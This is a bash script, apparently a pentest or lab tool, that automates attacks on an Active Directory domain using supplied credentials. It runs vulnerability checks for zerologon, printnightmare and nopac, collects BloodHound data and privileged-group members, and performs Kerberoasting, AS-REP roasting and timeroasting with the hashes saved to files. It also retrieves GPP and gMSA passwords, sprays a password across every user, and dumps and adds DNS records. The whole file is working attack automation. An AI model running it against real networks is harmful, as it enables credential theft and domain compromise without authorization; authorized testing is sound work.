#!/bin/bash


if [ $# -ne 6 ] # Check for given arguments
then
	echo -e -e "You need to specify the domain, DC hostname, DC ip, user, password between simple quotes and auth protocol (NTLM/KERBEROS).\n"
	echo -e -e "Usage:"
	echo -e -e "\t$0 <domain.local> <dc_hostname> <dc_ip> <user> '<password>' <auth_protocol>"
	exit 1
	
elif [ "$6" != "NTLM" ] && [ "$6" != "KERBEROS" ] # Check Auth Protocol
then
	echo -e "Wrong authentication protocol specified, it needs to be NTLM or KERBEROS"
	exit 1
else
	domain=$1
	dc_hostname=$2
	dc_ip=$3
	user=$4
	password=$5
	auth_protocol=$6
	base_dn=$(echo -e "$domain" | sed -E 's/([^.]+)(\.|$)/DC=\U\1\E,/g;s/,$//') # Transform domain.local to DC=DOMAIN,DC=LOCAL
fi



# COLORS

NOCOLOR='\033[0m'
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'


# FUNCTIONS

function result {
	if [ $? -eq 0 ]
	then
		echo -e "\n$GREEN Command successfull $NOCOLOR\n"
	else
		echo -e "\n$RED Command failed, status code : $?\n"
	fi
}

function clock_sync {
	sudo ntpdate $dc_ip
	result
}

function get_TGT {
	getTGT.py $domain/$user:$password -dc-ip $dc_hostname
	export KRB5CCNAME=$user.ccache
	result
}

function cve_check {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u $user -p $password -k -M zerologon
		nxc smb $dc_hostname -u $user -p $password -k -M ms17-010
		nxc smb $dc_hostname -u $user -p $password -k -M coerce_plus
		
		nxc smb $dc_hostname -u $user -p $password -k -M nopac
		nxc smb $dc_hostname -u $user -p $password -k -M printnightmare
		nxc smb $dc_hostname -u $user -p $password -k -M smbghost
		nxc smb $dc_hostname -u $user -p $password -k -M ntlm_reflection
		nxc smb $dc_hostname -u $user -p $password -k -M remove-mic
		nxc ldap $dc_hostname -u $user -p $password -k -M badsuccessor
	else
		nxc smb $dc_ip -u '' -p '' -M zerologon
		nxc smb $dc_ip -u '' -p '' -M ms17-010
		nxc smb $dc_ip -u '' -p '' -M coerce_plus
	
		nxc smb $dc_ip -u $user -p $password -M nopac
		nxc smb $dc_ip -u $user -p $password -M printnightmare
		nxc smb $dc_ip -u $user -p $password -M smbghost
		nxc smb $dc_ip -u $user -p $password -M ntlm_reflection
		nxc smb $dc_ip -u $user -p $password -M remove-mic
		nxc ldap $dc_ip -u $user -p $password -M badsuccessor
	fi
	result
}

function collect_Bloodhound_data {	
	if [ $auth_protocol == "KERBEROS" ]
	then
		bloodhound-ce-python -c All,LoggedOn --zip -d $domain -u $user -p $password -ns $dc_ip -k -no-pass
	else
		bloodhound-ce-python -c All,LoggedOn --zip -d $domain -u $user -p $password -ns $dc_ip 
	fi
	result
}

function get_AD_users {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k --users | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d'  > ad_users.txt
	else
		nxc ldap $dc_ip -u $user -p $password --users | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d'  > ad_users.txt
	fi
	result
	echo -e "$GREEN AD users collected in ad_users.txt $NOCOLOR"
}

function get_AD_groups {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(objectclass=group)" "" | grep sAMAccountName | grep -oP '(?<=sAMAccountName       ).*' > ad_groups.txt
	else
		ldapsearch -H ldap://$dc_ip -D $user@$domain -w $password -x -b "$base_dn" -s sub "(&(objectclass=group))" | grep sAMAccountName: | cut -f2 -d":" > ad_groups.txt
	fi
	result
	echo -e "$GREEN AD groups collected in ad_groups.txt $NOCOLOR"
}

function get_AD_computers {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(objectclass=computer)" "" | grep sAMAccountName | grep -oP '(?<=sAMAccountName       ).*' > ad_computers.txt
	else
		ldapsearch -H ldap://$dc_ip -D $user@$domain -w $password -x -b "$base_dn" -s sub "(&(objectclass=computer))" | grep sAMAccountName: | cut -f2 -d":" -d" " > ad_computers.txt
	fi
	result
	echo -e "$GREEN AD computers collected in ad_computers.txt $NOCOLOR"
}

function get_PRE2K_AD_computers {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache -M pre2k
	else
		nxc ldap $dc_ip -u $user -p $password -M pre2k
	fi
	result
}

function get_AD_users_desc {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k -M get-desc-users > ad_users_desc.txt
	else
		nxc ldap $dc_ip -u $user -p $password -M get-desc-users > ad_users_desc.txt
	fi
	result
	echo -e "$GREEN AD users descriptions collected in ad_users_desc.txt $NOCOLOR"
}

function get_MAQ {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k -M maq
	else
		nxc ldap $dc_ip -u $user -p $password -M maq
	fi
	result
}

function get_privileged_users {
	if [ $auth_protocol == "KERBEROS" ]
	then
		admin_count_users=$(nxc ldap $dc_hostname -u $user -p $password -k --admin-count | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d')
		psremote_users=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Remote Management Users)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		rdp_users=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Remote Desktop Users)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		sqladmin_users=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=*SQL*)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		backup_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Backup Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		event_log_readers=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Event Log Readers)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		dns_admins=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=DnsAdmin)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		hyperv_admins=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Hyper-V Administrators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		print_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Print Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		server_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Server Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		account_operators=$(nxc ldap $dc_hostname -u $user -k --kdcHost $dc_hostname --use-kcache --query "(cn=Account Operators)" member | grep member | cut -d',' -f1 | cut -d'=' -f2)
		
	else
		admin_count_users=$(nxc ldap $dc_ip -u $user -p $password --admin-count | awk '{print $5}' | sed "/^\[\*\]/d" | sed "/^\[+\]/d" | sed '/^-Username-/d')
		psremote_users=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Remote Management Users)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		rdp_users=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Remote Desktop Users)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		sqladmin_users=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=*SQL*)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		backup_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Backup Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		event_log_readers=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Event Log Readers)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		dns_admins=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=DnsAdmin)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		hyperv_admins=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Hyper-V Administrators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		print_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Print Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		server_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Server Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		account_operators=$(ldapsearch -H ldap://$dc_hostname -D $user@$domain -w $password -x -b "$base_dn" "(cn=Account Operators)" member | grep member: | cut -d',' -f1 | cut -d'=' -f2)
		
	fi
	result
	echo -e $YELLOW"\nUsers with admin-count 1 : \n\n$PURPLE$admin_count_users\n" | tee privileged_users.txt
	echo -e $YELLOW"\nUsers who can PsRemote : \n\n$PURPLE$psremote_users\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who can RDP : \n\n$PURPLE$rdp_users\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are SQL Admins : \n\n$PURPLE$sqladmin_users\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Backup Operators : \n\n$PURPLE$backup_operators\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Event Log Readers : \n\n$PURPLE$event_log_readers\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Dns Admins : \n\n$PURPLE$dns_admins\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Hyper-V Admins : \n\n$PURPLE$hyperv_admins\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Print Operators : \n\n$PURPLE$print_operators\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Server Operators : \n\n$PURPLE$server_operators\n$NOCOLOR" | tee -a privileged_users.txt
	echo -e $YELLOW"\nUsers who are Account Operators : \n\n$PURPLE$account_operators\n$NOCOLOR" | tee -a privileged_users.txt
}

function get_DC_shares {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u $user -p $password -k --shares | tee dc_shares.txt
	else
		nxc smb $dc_ip -u $user -p $password --shares | tee dc_shares.txt
	fi
	result
}

function kerberoasting {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k --kdcHost $dc_hostname --kerberoasting SPNs.txt
	else
		nxc ldap $dc_ip -u $user -p $password --kdcHost $dc_hostname --kerberoasting SPNs.txt
	fi
	result
	echo -e "$GREEN Kerberoastable users hashes collected in SPNs.txt if vulnerable.$NOCOLOR"
}

function asrep_roasting {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u ad_users.txt -p '' -k --kdcHost $dc_hostname --asreproast ASREP.txt
	else
		nxc ldap $dc_ip -u ad_users.txt -p '' --kdcHost $dc_hostname --asreproast ASREP.txt
	fi
	result
	echo -e "$GREEN AS-Reproastable users hashes collected in ASREP.txt if vulnerable.$NOCOLOR"
}

function timeroasting {
	nxc smb $dc_ip -M timeroast | grep 'sntp-ms' | cut -f2 -d":" | tee timeroast.hashes
	result
	echo -e "$GREEN Timeroast hashes collected in timeroast.hashes if vulnerable.$NOCOLOR"
}

function get_GPP_passwords {
	if [ $auth_protocol == "KERBEROS" ]
	then 
		nxc smb $dc_hostname -u $user -p $password -k -M gpp_password
		nxc smb $dc_hostname -u $user -p $password -k -M gpp_autologin
	else
		nxc smb $dc_ip -u $user -p $password -M gpp_password
		nxc smb $dc_hostname -u $user -p $password -k -M gpp_autologin
	fi	
	result
}

function get_password_policy {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u $user -p $password -k --pass-pol | tee pass_pol.txt
	else
		nxc smb $dc_ip -u $user -p $password --pass-pol | tee pass_pol.txt
	fi
	result
}

function password_spraying {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u ad_users.txt -p $password -k --kdcHost $dc_hostname --continue-on-success | grep +
	else
		nxc smb $dc_ip -u ad_users.txt -p $password --continue-on-success | grep +
	fi
	result
}

function get_gMSA {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc ldap $dc_hostname -u $user -p $password -k --gmsa | tee gMSA_accounts.txt
	else
		nxc ldap $dc_ip -u $user -p $password --gmsa | tee gMSA_accounts.txt
	fi
	result
}

function get_delegations {
	if [ $auth_protocol == "KERBEROS" ]
	then
		echo -e "$YELLOW Constrained Delegations :$NOCOLOR"
		nxc ldap $dc_hostname -u $user -p $password -k --find-delegation
		echo -e "$YELLOW Unconstrained Delegations :$NOCOLOR"
		nxc ldap $dc_hostname -u $user -p $password -k "--trusted-for-delegation"
	else
		echo -e "$YELLOW Constrained Delegations :$NOCOLOR"
		nxc ldap $dc_ip -u $user -p $password --find-delegation
		echo -e "$YELLOW Unconstrained Delegations :$NOCOLOR"
		nxc ldap $dc_ip -u $user -p $password "--trusted-for-delegation"
	fi
	result
}

function get_writable_objects {
	if [ $auth_protocol == "KERBEROS" ]
	then
		bloodyAD --host $dc_hostname -d $domain -u $user -p $password -k get writable --detail
	else
		bloodyAD --host $dc_ip -d $domain -u $user -p $password get writable --detail
	fi
	result
}

function enum_AV {
	if [ $auth_protocol == "KERBEROS" ]
	then
		nxc smb $dc_hostname -u $user -p $password -k -M enum_av
	else
		nxc smb $dc_ip -u $user -p $password -M enum_av
	fi
	result
}

function DNS_enum {

	echo -e "\n$CYAN--Dumping DNS records...$NOCOLOR\n"
	mkdir DNS_records
	if [ $auth_protocol == "KERBEROS" ]
	then
		echo -e "$RED DNS records not dumped due to Kerberos, need to find a way using ldapsearch...$NOCOLOR"
	else
		adidnsdump -u $domain\\$user -p $password ldap://$dc_ip --outfile DNS_records/base_records.csv
		adidnsdump -u $domain\\$user -p $password ldap://$dc_ip --forest --outfile DNS_records/forest_records.csv
		adidnsdump -u $domain\\$user -p $password ldap://$dc_ip --legacy  --outfile DNS_records/legacy_records.csv
		echo -e "$GREEN\nDumped all DNS records in DNS_records directory$NOCOLOR"
	fi
	result
	
	echo -e "\n$CYAN--Trying to create a DNS record...$NOCOLOR\n"
	if [ $auth_protocol == "KERBEROS" ]
	then
		dns_query=$(dnstool -u $domain\\$user -p $password -k --record 'TESTRECORD' --action query $dc_hostname)
		if [ -n "$dns_query" ]
		then
			echo -e "$GREEN\nDNS record 'TESTRECORD' already exists...$NOCOLOR\n"
		else
			dnstool -u $domain\\$user -p $password -k --record 'TESTRECORD' --action add --data 10.10.16.3 $dc_hostname
			dns_query=$(dnstool -u $domain\\$user -p $password -k --record 'TESTRECORD' --action query $dc_hostname)
			if [ -n "$dns_query" ]
			then
				echo -e "$GREEN\nDNS record 'TESTRECORD' has been created...$NOCOLOR\n"
				dnstool -u $domain\\$user -p $password -k --record 'TESTRECORD' --action ldapdelete --data 10.10.16.3 $dc_hostname
				echo -e "$GREEN\nDNS record 'TESTRECORD' has been deleted...$NOCOLOR\n"
			fi
		fi
	else
		dns_query=$(dnstool -u $domain\\$user -p $password --record 'TESTRECORD' --action query $dc_ip)
		if [ -n "$dns_query" ]
		then
			echo -e "$GREEN\nDNS record 'TESTRECORD' already exists...$NOCOLOR\n"
		else
			dnstool -u $domain\\$user -p $password --record 'TESTRECORD' --action add --data 10.10.16.3 $dc_ip
			dns_query=$(dnstool -u $domain\\$user -p $password --record 'TESTRECORD' --action query $dc_ip)
			if [ -n "$dns_query" ]
			then
				echo -e "$GREEN\nDNS record 'TESTRECORD' has been created...$NOCOLOR\n"
				dnstool -u $domain\\$user -p $password --record 'TESTRECORD' --action ldapdelete --data 10.10.16.3 $dc_ip
				echo -e "$GREEN\nDNS record 'TESTRECORD' has been deleted...$NOCOLOR\n"
			fi
		fi
	fi
	result
}


function main {
	echo -e "\n$CYAN--Synchronising clock with the DC...$NOCOLOR\n"
	clock_sync
	echo -e "\n$CYAN--Requesting kerberos ticket for $user...$NOCOLOR\n"
	get_TGT
	echo -e "\n$CYAN--Checking CVEs...$NOCOLOR\n"
	cve_check
	echo -e "\n$CYAN--Running Sharphound data collection...$NOCOLOR\n"
	collect_Bloodhound_data
	echo -e "\n$CYAN--Collecting users...$NOCOLOR\n"
	get_AD_users
	echo -e "\n$CYAN--Collecting groups...$NOCOLOR\n"
	get_AD_groups
	echo -e "\n$CYAN--Collecting computers...$NOCOLOR\n"
	get_AD_computers
	echo -e "\n$CYAN--Checking Pre2k computers...$NOCOLOR\n"
	get_PRE2K_AD_computers
	echo -e "\n$CYAN--Collecting users descriptions...$NOCOLOR\n"
	get_AD_users_desc
	echo -e "\n$CYAN--Checking Machine Account Quota...$NOCOLOR\n"
	get_MAQ
	echo -e "\n$CYAN--Identifying privileged users...$NOCOLOR\n"
	get_privileged_users
	echo -e "\n$CYAN--Retrieving DC shares...$NOCOLOR\n"
	get_DC_shares
	echo -e "\n$CYAN--Attempting Kerberoasting...$NOCOLOR\n"
	kerberoasting
	echo -e "\n$CYAN--Attempting ASREP-roasting...$NOCOLOR\n"
	asrep_roasting
	echo -e "\n$CYAN--Attempting Timeroasting...$NOCOLOR\n"
	timeroasting
	echo -e "\n$CYAN--Retrieving GPP passwords...$NOCOLOR\n"
	get_GPP_passwords
	echo -e "\n$CYAN--Getting the domain password policy...$NOCOLOR\n"
	get_password_policy
	echo -e "\n$CYAN--Spraying the given user's password...$NOCOLOR\n"
	password_spraying
	echo -e "\n$CYAN--Getting gMSA...$NOCOLOR\n"
	get_gMSA
	echo -e "\n$CYAN--Enumerating delegations...$NOCOLOR\n"
	get_delegations
	echo -e "\n$CYAN--Enumerating writable objects for $user...$NOCOLOR\n"
	get_writable_objects
	echo -e "\n$CYAN--Enumerating installed AV...$NOCOLOR\n"
	enum_AV
	DNS_enum
	echo -e "\n$GREEN--Enumeration fully completed, have fun ;)"
}

main
